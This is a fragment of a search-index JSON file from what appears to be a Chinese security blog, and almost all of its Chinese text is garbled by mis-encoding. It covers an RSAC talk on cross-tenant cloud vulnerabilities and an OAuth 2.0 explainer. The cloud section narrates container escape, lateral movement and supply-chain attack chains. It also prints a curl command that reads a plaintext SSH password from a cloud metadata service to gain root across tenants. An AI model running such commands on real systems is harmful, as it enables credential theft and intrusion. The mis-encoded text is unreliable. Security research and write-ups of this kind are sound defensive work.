ç§Ÿæˆ·éš”ç¦»ä¸ä»…ä»…æ˜¯è¦å®ç°éš”ç¦»è®¡ç®—èµ„æºã€‚è¿˜æœ‰æœ‰å…¶å®ƒèµ„æºå’Œå…¶å®ƒèµ„äº§ã€‚é¦–å…ˆæ¥çœ‹ï¼Œåœ¨ä¸€ä¸ªå¸¸è§çš„ç§Ÿæˆ·éš”ç¦»ç³»ç»Ÿä¸­ï¼Œæœ‰å“ªäº›é£é™©æš´éœ²é¢ï¼š æ¯”å¦‚åƒ Kubernetes æˆ– service Fabric è¿™æ ·çš„ç¼–æ’å™¨ã€å†…éƒ¨ APIã€‚æ­¤å¤–é€šå¸¸æ‰˜ç®¡æœåŠ¡è¿è¡Œåœ¨å…±äº«ç½‘ç»œç¯å¢ƒä¸­ï¼Œæ•°æ®å¯ä»¥é€šè¿‡å…±äº«ç½‘ç»œè¿›è¡Œäº¤äº’ã€‚å¦å¤–å­˜å‚¨ã€èº«ä»½è®¤è¯è®¾æ–½ç­‰ä¹ŸåŒæ ·éœ€è¦è€ƒè™‘éš”ç¦»ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:3:0","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 é˜¿é‡Œäº‘ AnalyticDB for PostgreSQL äº‘åŸç”Ÿæ•°æ®ä»“åº“AnalyticDB PostgreSQLç‰ˆæ˜¯ä¸€ç§å¤§è§„æ¨¡å¹¶è¡Œå¤„ç†ï¼ˆMPPï¼‰æ•°æ®ä»“åº“æœåŠ¡ï¼Œå¯æä¾›æµ·é‡æ•°æ®åœ¨çº¿åˆ†ææœåŠ¡ã€‚ é’ˆå¯¹ AnalyticDB for PostgreSQL çš„æ”»å‡»é“¾å¤§è‡´å¦‚ä¸‹ï¼š åˆ©ç”¨ cronjob å®šæ—¶ä»»åŠ¡ææƒè‡³å®¹å™¨å†…çš„ root æƒé™ã€‚ åˆ©ç”¨ Pod å†…å®¹å™¨å…±äº« PID å‘½åç©ºé—´çš„ç‰¹æ€§æ¨ªå‘ç§»åŠ¨åˆ° Pod ä¸­çš„ç›¸é‚»ç‰¹æƒå®¹å™¨ã€‚ åˆ©ç”¨ç‰¹æƒå®¹å™¨é€ƒé€¸è‡³å®¿ä¸»æœºã€‚ åˆ©ç”¨å®¿ä¸»æœºä¸Šçš„ kubelet å‡­è¯è®¿é—®æ•æ„Ÿèµ„æºï¼ŒåŒ…æ‹¬å¯†é’¥ã€serviceaccount å’Œ Podã€‚ åˆ©ç”¨æ”¶é›†åˆ°çš„å‡­è¯è®¿é—®é˜¿é‡Œäº‘ç§æœ‰å®¹å™¨é•œåƒä»“åº“ï¼ŒæŸ¥çœ‹å‡­è¯æƒé™ã€‚ ç»æµ‹è¯•å‘ç°å‡­æ®å…·æœ‰å®¹å™¨é•œåƒä»“åº“çš„è¯»å–å’Œå†™å…¥æƒé™ï¼Œå…è®¸å‘èµ·ä¾›åº”é“¾æ”»å‡»ã€‚ å·²æœ‰ç›¸å…³æ–‡ç« åˆ†æè¯¥æ¼æ´ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:3:1","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.2 Azure Database for PostgreSQL åœ¨ Azure Database for PostgreSQL ä¸­ï¼Œä¸åŒç§Ÿæˆ·é—´çš„æ•°æ®åº“å¹¶æ²¡æœ‰åšç½‘ç»œéš”ç¦»ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªç§Ÿæˆ·é—´æ˜¯æœ‰ç½‘ç»œè”é€šçš„ã€‚Wiz çš„ç ”ç©¶äººå‘˜é¦–å…ˆé€šè¿‡æ¼æ´è·å¾—äº†å¯¹è‡ªå·±æ•°æ®åº“çš„è®¿é—®æƒï¼Œåˆå› ä¸ºå½“å‰æœºå™¨èƒ½å¤Ÿä¸å…¶å®ƒæ•°æ®åº“é€šä¿¡ï¼Œå¹¶é€šè¿‡ä¼ªé€  SSL è¯ä¹¦ï¼Œå¹¶ç»•è¿‡å¯¹å…¶å®ƒæ•°æ®åº“çš„èº«ä»½éªŒè¯ï¼Œè·å–å¯¹å…¶å®ƒç§Ÿæˆ·æ•°æ®çš„å®Œå…¨è¯»å–æƒé™ã€‚å¾®è½¯å¯¹æ­¤æ¼æ´çš„ä¿®å¤æ˜¯å¯¹ç§Ÿæˆ·é—´çš„ç½‘ç»œè¿›è¡Œéš”ç¦»ï¼Œæ¥ä¿è¯ç§Ÿæˆ·é—´çš„ç›¸å¯¹ç‹¬ç«‹ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:3:2","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.3 IBM Managed Databases IBM Managed Databases è¿™ä¸ªæ¡ˆä¾‹æ¯”è¾ƒæœ‰è¶£ï¼Œåœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼ŒIBM æœåŠ¡çš„æ¶æ„æ¯”è¾ƒå®Œå–„ï¼Œèµ„æºåˆ†ç¦»ä¹Ÿè®¾è®¡å¾—å¾ˆå¥½ï¼Œæ¯ä¸ªç§Ÿæˆ·æœ‰ä¸“é—¨çš„ Kubernetes å‘½åç©ºé—´ï¼š ä½†æ˜¯ç ”ç©¶äººå‘˜åœ¨å®¹å™¨ä¸­å‘ç°äº† K8S API çš„ç½‘ç»œè¿æ¥ï¼ŒåŒæ—¶ï¼Œç”±äº K8S æœ¬èº«é…ç½®ä¸å½“ï¼Œå°†é«˜æƒé™ service account æŒ‚åœ¨åˆ°å½“å‰ pod ä¸­ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨è¯¥ Token å‘ K8S API ç›´æ¥å‘é€è¯·æ±‚ï¼Œæ‰§è¡Œ K8S ç›¸å…³æ“ä½œã€‚ç»è¿‡ç ”ç©¶äººå‘˜çš„æµ‹è¯•ï¼Œè¯¥ Token æœ‰åœ¨ç§æœ‰ä»“åº“æ‹‰å–é•œåƒçš„æƒé™ï¼š å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¿åˆ°é•œåƒä»“åº“çš„æ‰€æœ‰é•œåƒï¼š é•œåƒä¸­åŒ…å«å¤§é‡æ•°æ®ï¼ŒåŒ…æ‹¬æºç ã€é…ç½®ç­‰ã€‚é€šè¿‡å¯¹é•œåƒå†…å®¹è¿›è¡Œåˆ†æï¼Œæ‰¾åˆ°å†…éƒ¨ CI/CD æœåŠ¡å™¨å‡­è¯ï¼Œå…·æœ‰è¯»å†™æƒé™ï¼Œå¯ä»¥å®æ–½ä¾›åº”é“¾æ”»å‡»ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:3:3","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.4 å…¶å®ƒæ¡ˆä¾‹ ç¬”è€…åœ¨å…¬å¸å†…éƒ¨æŸäº§å“çº¿åšå®‰å…¨æµ‹è¯•æ—¶ï¼Œä¹Ÿæ›¾é‡åˆ°è¿‡ç±»ä¼¼çš„å®‰å…¨é—®é¢˜ï¼Œç”±äºç§Ÿæˆ·é—´æœªåšå¥½éš”ç¦»ï¼Œå¯¼è‡´è·å–å¤§é‡ç§Ÿæˆ·æƒé™ä¸æ•°æ®çš„é—®é¢˜ã€‚ ä»¥å…¶ä¸­ä¸€ä¸ªä¸ºä¾‹ï¼š åœ¨æŸç«™ç‚¹åˆ›å»ºè¿œç¨‹è®¡ç®—èµ„æºï¼ˆåœ¨çº¿ IDEï¼‰æ—¶ï¼Œç”¨æˆ·ä¼šæ”¶åˆ°ä¸€å°æ¥å…¥å†…ç½‘çš„ VPN é…ç½®è¿æ¥é‚®ä»¶ï¼Œåœ¨æ‹¨å…¥ VPN åï¼Œå‘ç°å†…ç½‘å¹¶æœªåšéš”ç¦»ï¼Œç§Ÿæˆ·é—´ç½‘ç»œäº’é€šã€‚ ç›´æ¥åœ¨å†…ç½‘ç”³è¯·çš„èµ„æºä¸»æœºä¸Šæ‰« 10.208.0.0/16 ç½‘æ®µï¼Œå‘ç°åšäº†éš”ç¦»ã€‚ä½†æ˜¯ï¼Œå°è¯•åœ¨æœ¬æœºä¸Šå¯¹ VPN ç½‘æ®µ 172.36.0.0/16 è¿›è¡Œæ‰«æï¼Œå‘ç°æœªåšéš”ç¦»ï¼Œç»“æœå¦‚ä¸‹ï¼š ä»¥å†…ç½‘ä¸€å°ç§Ÿæˆ·ç”³è¯·çš„æœºå™¨ä¸ºä¾‹ï¼Œç”±äºåœ¨çº¿ IDE å…·æœ‰ Terminal åŠŸèƒ½ï¼Œä¸”æœªå¯¹ç”¨æˆ·æƒé™åšæ ¡éªŒï¼Œå› æ­¤å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨çº¿ IDE ä¸­çš„ç”¨æˆ·ä¸º devkit æ™®é€šç”¨æˆ·ï¼š ç»è¿‡ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°æ­¤ç±»ä¸»æœºå‡ä¸ºäº‘ä¸Šç»Ÿä¸€ä¸‹å‘çš„æœºå™¨ï¼ŒæŸ¥çœ‹æŸ¥è¯¢ ECS çš„ç”¨æˆ·è‡ªå®šä¹‰æ•°æ®æ‰¾åˆ°åˆå§‹åŒ– SSH ç™»å½•å¯†é’¥ï¼š curl http://169.254.169.254/openstack/latest/user_data åœ¨ user_data è®°å½•äº† SSH çš„æ˜æ–‡å¯†ç ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨è¯¥å¯†ç åˆ‡æ¢åˆ° root: é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥æ‰¹é‡æ¨ªå‘åˆ°å„ä¸ªç§Ÿæˆ·ï¼Œè·å–å¤§é‡ç§Ÿæˆ·èµ„æºæœºå™¨çš„ root æƒé™ï¼Œå¹¶ç™»å½• SSHï¼Œè·å–æœºå™¨å†…å­˜æ”¾çš„å„ç§èµ„æºæ–‡ä»¶ã€‚ ","date":"2023-05-31","objectID":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/:3:4","tags":["æ¸—é€æµ‹è¯•"],"title":"RSACè®®é¢˜è§£è¯»-äº‘ä¸Šè·¨ç§Ÿæˆ·æ¼æ´æ”»å‡»é¢åˆ†æ","uri":"/2023/05/rsac%E8%AE%AE%E9%A2%98%E8%A7%A3%E8%AF%BB-%E4%BA%91%E4%B8%8A%E8%B7%A8%E7%A7%9F%E6%88%B7%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"OAuth 2.0åè®®åŠæ¼æ´","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"OAuth 2.0åè®®åŠæ¼æ´ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:0:0","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1 OAuth 2.0 åè®®ç®€ä»‹ OAuth 2.0 æ˜¯ä¸€ç§æˆæƒæœºåˆ¶ï¼Œå¸¸ç”¨æ¥æˆæƒç¬¬ä¸‰æ–¹åº”ç”¨ç™»å½•ã€‚æ•°æ®çš„æ‰€æœ‰è€…å‘Šè¯‰ç³»ç»Ÿï¼ŒåŒæ„æˆæƒç¬¬ä¸‰æ–¹åº”ç”¨è·å–ç”¨æˆ·çš„æ•°æ®ã€‚ç³»ç»Ÿä»è€Œäº§ç”Ÿä¸€ä¸ªçŸ­æœŸçš„è¿›å…¥ä»¤ç‰Œï¼ˆtokenï¼‰ï¼Œç”¨æ¥ä»£æ›¿å¯†ç ï¼Œä¾›ç¬¬ä¸‰æ–¹åº”ç”¨ä½¿ç”¨ã€‚ é€šä¿—çš„è®²ï¼Œå¾ˆå¤šç½‘ç«™ç™»å½•æ—¶ï¼Œå…è®¸ä½¿ç”¨ç¬¬ä¸‰æ–¹ç½‘ç«™çš„èº«ä»½ç™»å½•ï¼Œå…¶æœ¬è´¨å°±æ˜¯é€šè¿‡ OAuth åè®®è¿›è¡Œæˆæƒã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:1:0","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.1 OAuth åè®®ä¸­çš„è§’è‰² Third-party applicationï¼šç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºï¼Œé€šå¸¸åˆè¢«ç§°ä¸ºâ€œå®¢æˆ·ç«¯â€ï¼ˆclientï¼‰ã€‚ HTTP serviceï¼šHTTP æœåŠ¡æä¾›å•†ï¼Œé€šå¸¸åˆç§°ä¸ºâ€œæœåŠ¡æä¾›å•†â€ã€‚ Resource Ownerï¼šèµ„æºæ‰€æœ‰è€…ï¼Œé€šå¸¸åˆç§°ä¸ºâ€œç”¨æˆ·â€ï¼ˆuserï¼‰ã€‚ User Agentï¼šç”¨æˆ·ä»£ç†ï¼Œé€šå¸¸å°±æ˜¯æŒ‡æµè§ˆå™¨ã€‚ Authorization serverï¼šè®¤è¯æœåŠ¡å™¨ï¼Œå³æœåŠ¡æä¾›å•†ä¸“é—¨ç”¨æ¥å¤„ç†è®¤è¯çš„æœåŠ¡å™¨ã€‚ Resource serverï¼šèµ„æºæœåŠ¡å™¨ï¼Œå³æœåŠ¡æä¾›å•†å­˜æ”¾ç”¨æˆ·ç”Ÿæˆçš„èµ„æºçš„æœåŠ¡å™¨ã€‚å®ƒä¸è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥æ˜¯åŒä¸€å°æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸åŒçš„æœåŠ¡å™¨ã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:1:1","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.2 OAuth åè®®çš„è®¤è¯æµç¨‹ OAuth 2.0 çš„è¿è¡Œæµç¨‹å¦‚ä¸‹å›¾ï¼š ç”¨æˆ·æ‰“å¼€å®¢æˆ·ç«¯ä»¥åï¼Œå®¢æˆ·ç«¯è¦æ±‚ç”¨æˆ·ç»™äºˆæˆæƒã€‚ ç”¨æˆ·åŒæ„ç»™äºˆå®¢æˆ·ç«¯æˆæƒã€‚ å®¢æˆ·ç«¯ä½¿ç”¨ä¸Šä¸€æ­¥è·å¾—çš„æˆæƒï¼Œå‘è®¤è¯æœåŠ¡å™¨ç”³è¯·ä»¤ç‰Œã€‚ è®¤è¯æœåŠ¡å™¨å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯ä»¥åï¼Œç¡®è®¤æ— è¯¯ï¼ŒåŒæ„å‘æ”¾ä»¤ç‰Œã€‚ å®¢æˆ·ç«¯ä½¿ç”¨ä»¤ç‰Œï¼Œå‘èµ„æºæœåŠ¡å™¨ç”³è¯·è·å–èµ„æºã€‚ èµ„æºæœåŠ¡å™¨ç¡®è®¤ä»¤ç‰Œæ— è¯¯ï¼ŒåŒæ„å‘å®¢æˆ·ç«¯å¼€æ”¾èµ„æºã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:1:2","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.3 OAuth 2.0 å››ç§æˆæƒæ–¹å¼ 1.3.1 authorization code - æˆæƒç æ¨¡å¼ æˆæƒç æ–¹å¼æŒ‡çš„æ˜¯ä¸‰æ–¹åº”ç”¨éœ€è¦å…ˆç”³è¯·æˆæƒç ï¼Œç„¶åå†ç”¨è¯¥æˆæƒç è·å–è®¿é—®ç³»ç»Ÿçš„ä»¤ç‰Œã€‚ ä¸‹é¢æ˜¯è¯¥æˆæƒæ–¹å¼çš„æµç¨‹å›¾ï¼Œä»¥ç¬¬ä¸‰æ–¹ç½‘ç«™ä½¿ç”¨ Github è´¦å·ç™»å½•ä¸ºä¾‹ï¼š Step1ï¼šç¬¬ä¸‰æ–¹ç½‘ç«™æä¾›ä¸€ä¸ªé“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»åå°±ä¼šè·³è½¬åˆ° Githubï¼Œæˆæƒç”¨æˆ·æ•°æ®ç»™ç¬¬ä¸‰æ–¹ç½‘ç«™ä½¿ç”¨ã€‚ä¸‹é¢å°±æ˜¯ç¬¬ä¸‰æ–¹ç½‘ç«™è·³è½¬ Github çš„ä¸€ä¸ªç¤ºæ„é“¾æ¥ã€‚ https://github.com/oauth/authorize? response_type=code\u0026 client_id=CLIENT_ID\u0026 redirect_uri=CALLBACK_URL\u0026 scope=read response_type å‚æ•°è¡¨ç¤ºè¦æ±‚ä»¥æˆæƒç codeå½¢å¼è¿”å›ç»“æœï¼Œclient_id å‚æ•°è®© github.com çŸ¥é“æ˜¯è°åœ¨è¯·æ±‚ï¼Œredirect_uriå‚æ•°æ˜¯ Github æ¥å—æˆ–æ‹’ç»è¯·æ±‚åçš„è·³è½¬ç½‘å€ï¼Œscopeå‚æ•°è¡¨ç¤ºè¦æ±‚çš„æˆæƒèŒƒå›´ï¼ˆè¿™é‡Œæ˜¯åªè¯»ï¼‰ã€‚ Step2ï¼šç”¨æˆ·è·³è½¬åï¼ŒGithub ä¼šè¦æ±‚ç”¨æˆ·ç™»å½•ï¼Œç„¶åè¯¢é—®æ˜¯å¦åŒæ„ç»™äºˆç¬¬ä¸‰æ–¹ç½‘ç«™æˆæƒã€‚ç”¨æˆ·è¡¨ç¤ºåŒæ„ï¼Œè¿™æ—¶ Github å°±ä¼šæŒ‰ç…§redirect_uriå‚æ•°æŒ‡å®šçš„ç½‘å€è¿›è¡Œè·³è½¬ï¼Œå¹¶ä¼ å›ä¸€ä¸ªæˆæƒç ï¼š https://a.com/callback?code=æˆæƒç  Step3ï¼šç¬¬ä¸‰æ–¹ç½‘ç«™æ‹¿åˆ°æˆæƒç ä»¥åï¼Œå‘ Github ç½‘ç«™è¯·æ±‚ä»¤ç‰Œã€‚ https://github.com/oauth/token? client_id=CLIENT_ID\u0026 client_secret=CLIENT_SECRET\u0026 grant_type=authorization_code\u0026 code=AUTHORIZATION_CODE\u0026 redirect_uri=CALLBACK_URL client_idå‚æ•°å’Œclient_secretå‚æ•°ç”¨æ¥è®© Github ç¡®è®¤ A çš„èº«ä»½ï¼› client_secret å‚æ•°æ˜¯ä¿å¯†çš„ï¼Œå› æ­¤åªèƒ½åœ¨åç«¯å‘è¯·æ±‚ï¼‰ï¼Œgrant_type å‚æ•°çš„å€¼æ˜¯ AUTHORIZATION_CODEï¼Œè¡¨ç¤ºé‡‡ç”¨çš„æˆæƒæ–¹å¼æ˜¯æˆæƒç ï¼Œcode å‚æ•°æ˜¯ Step2 æ‹¿åˆ°çš„æˆæƒç ï¼Œredirect_uri å‚æ•°æ˜¯ä»¤ç‰Œé¢å‘åçš„å›è°ƒç½‘å€ã€‚ Step4ï¼šGithub æ”¶åˆ°è¯·æ±‚ä»¥åå‘ç¬¬ä¸‰æ–¹ç½‘ç«™é¢å‘ä»¤ç‰Œã€‚å³ï¼šå‘ redirect_uri æŒ‡å®šçš„ç½‘å€å‘é€ä¸€æ®µæ•°æ®ï¼Œå¦‚ï¼š { \"access_token\":\"ACCESS_TOKEN\", \"token_type\":\"bearer\", \"expires_in\":2592000, \"refresh_token\":\"REFRESH_TOKEN\", \"scope\":\"read\", \"uid\":100101, \"info\": \"...\" } åç»­ç¬¬ä¸‰æ–¹ç½‘ç«™å°±å¯ä»¥å¸¦ç€è¿™ä¸ª Token è·å–è¯·æ±‚ç”¨æˆ·èµ„æºäº†ã€‚ 1.3.2 implicit - éšè—å¼ è¿™ç§æ¨¡å¼å…è®¸ç›´æ¥å‘å‰ç«¯é¢å‘ä»¤ç‰Œï¼Œè¿™ç§æ–¹å¼ç®€åŒ–äº†è·å–æˆæƒç çš„ä¸­é—´æ­¥éª¤ã€‚ Step1ï¼šç¬¬ä¸‰æ–¹ç½‘ç«™æä¾›ä¸€ä¸ªé“¾æ¥ï¼Œè¦æ±‚ç”¨æˆ·è·³è½¬åˆ° Github ç½‘ç«™ï¼Œæˆæƒç”¨æˆ·æ•°æ®ç»™ç¬¬ä¸‰æ–¹ç½‘ç«™ä½¿ç”¨ã€‚ https://github.com/oauth/authorize? response_type=token\u0026 client_id=CLIENT_ID\u0026 redirect_uri=CALLBACK_URL\u0026 scope=read Step2ï¼šç”¨æˆ·è·³è½¬åˆ° Githubï¼Œç™»å½•ååŒæ„ç»™äºˆç¬¬ä¸‰æ–¹ç½‘ç«™æˆæƒã€‚è¿™æ—¶ï¼ŒGithub ç½‘ç«™å°±ä¼šè·³å› redirect_uri å‚æ•°æŒ‡å®šçš„è·³è½¬ç½‘å€ï¼Œå¹¶ä¸”æŠŠä»¤ç‰Œä½œä¸º URL å‚æ•°ï¼Œä¼ ç»™ç¬¬ä¸‰æ–¹ç½‘ç«™ã€‚ https://a.com/callback#token=ACCESS_TOKEN tokenå‚æ•°å°±æ˜¯ä»¤ç‰Œï¼Œç¬¬ä¸‰æ–¹å¯ä»¥ç›´æ¥åœ¨å‰ç«¯æ‹¿åˆ°ä»¤ç‰Œã€‚ ä»¤ç‰Œçš„ä½ç½®ä¿å­˜åœ¨ URL é”šç‚¹ä¸­ï¼Œå› ä¸º OAuth 2.0 å…è®¸è·³è½¬ç½‘å€ä½¿ç”¨ HTTP åè®®ï¼Œå› æ­¤å­˜åœ¨â€œä¸­é—´äººæ”»å‡»â€çš„é£é™©ï¼Œè€Œæµè§ˆå™¨è·³è½¬æ—¶ï¼Œé”šç‚¹ä¸ä¼šå‘åˆ°æœåŠ¡ç«¯ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘ä»¤ç‰Œæ³„æ¼çš„é£é™©ã€‚ 1.3.3 password - å¯†ç å¼ å¦‚æœæŸä¸ªåº”ç”¨å¤„åœ¨ç›¸å¯¹ä¿¡ä»»çš„ç¯å¢ƒï¼ŒRFC 6749 ä¹Ÿå…è®¸ç”¨æˆ·æŠŠç”¨æˆ·åå’Œå¯†ç ç›´æ¥ä¼ é€’ç»™è¯¥åº”ç”¨ã€‚è¯¥åº”ç”¨é€šè¿‡ä½¿ç”¨ç”¨æˆ·çš„å¯†ç ç”³è¯·ä»¤ç‰Œã€‚ Step 1ï¼šç¬¬ä¸‰æ–¹ç½‘ç«™è¦æ±‚ç”¨æˆ·æä¾› Github ç½‘ç«™çš„ç”¨æˆ·åå’Œå¯†ç ã€‚ç¬¬ä¸‰æ–¹ç½‘ç«™æ‹¿åˆ°å‡­æ®åï¼Œç›´æ¥å‘ Github è¯·æ±‚ä»¤ç‰Œã€‚ https://github.com/token? grant_type=password\u0026 username=USERNAME\u0026 password=PASSWORD\u0026 client_id=CLIENT_ID Step 2ï¼šGithub éªŒè¯èº«ä»½é€šè¿‡åï¼Œç›´æ¥ç»™å‡ºä»¤ç‰Œã€‚è¿™ç§æƒ…å†µä¸‹ä¸éœ€è¦ redirect è·³è½¬ï¼Œè€Œæ˜¯æŠŠä»¤ç‰Œæ”¾åœ¨ JSON æ•°æ®é‡Œé¢ï¼Œä½œä¸º HTTP å›åº”ï¼ŒA å› æ­¤æ‹¿åˆ°ä»¤ç‰Œã€‚ 1.3.4 client credentials - å‡­è¯å¼ è¿™ç§æ–¹å¼é€‚ç”¨äºæ²¡æœ‰å‰ç«¯çš„å‘½ä»¤è¡Œåº”ç”¨ï¼Œå³åœ¨å‘½ä»¤è¡Œä¸‹è¯·æ±‚ä»¤ç‰Œã€‚ Step 1ï¼šç¬¬ä¸‰æ–¹åœ¨å‘½ä»¤è¡Œå‘ Github å‘å‡ºè¯·æ±‚ã€‚ https://github.com/token? grant_type=client_credentials\u0026 client_id=CLIENT_ID\u0026 client_secret=CLIENT_SECRET Step 2ï¼šGithub éªŒè¯é€šè¿‡ä»¥åï¼Œç›´æ¥è¿”å›ä»¤ç‰Œã€‚ è¿™ç§æ–¹å¼ç»™å‡ºçš„ä»¤ç‰Œï¼Œæ˜¯é’ˆå¯¹ç¬¬ä¸‰æ–¹åº”ç”¨çš„ï¼Œè€Œä¸æ˜¯é’ˆå¯¹ç”¨æˆ·ä¸ªäººçš„ï¼Œå› æ­¤å­˜åœ¨å¤šä¸ªç”¨æˆ·å…±äº«åŒä¸€ä¸ªä»¤ç‰Œçš„å¯èƒ½æ€§ã€‚ ","date":"2023-05-01","objectID":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/:1:3","tags":["äº‘åŸç”Ÿå®‰å…¨","OAuth"],"title":"OAuth 2.0åè®®åŠæ¼æ´","uri":"/2023/05/oauth-2.0%E5%8D%8F%E8%AE%AE%E5%8F%8A%E6%BC%8F%E6%B4%9E/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"1.4 